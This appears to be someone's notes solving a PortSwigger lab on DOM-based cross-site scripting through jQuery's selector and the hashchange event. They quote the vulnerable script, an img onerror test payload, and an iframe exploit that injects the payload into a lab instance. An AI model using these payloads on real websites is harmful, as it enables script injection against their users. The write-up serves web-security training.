

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event
This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.



1) go on the home page and see in ZAP that jQuery is used to manage the # (to go directly on a section of the page)

    <script>
        $(window).on('hashchange', function(){
            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
            if (post) post.get(0).scrollIntoView();
        });
    </script>


2) now if we inject 
    #<img src=1 onerror=alert()>

    the alert is shown because we trigger the hashchange and we inject the malicious image tag


    
3) so we need to construct an attack on the exploit server to send to the victim that triggers the hashchange event and injects the alert

    <iframe src = "https://0a71000b048a35f782b11a4a008d0025.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'">
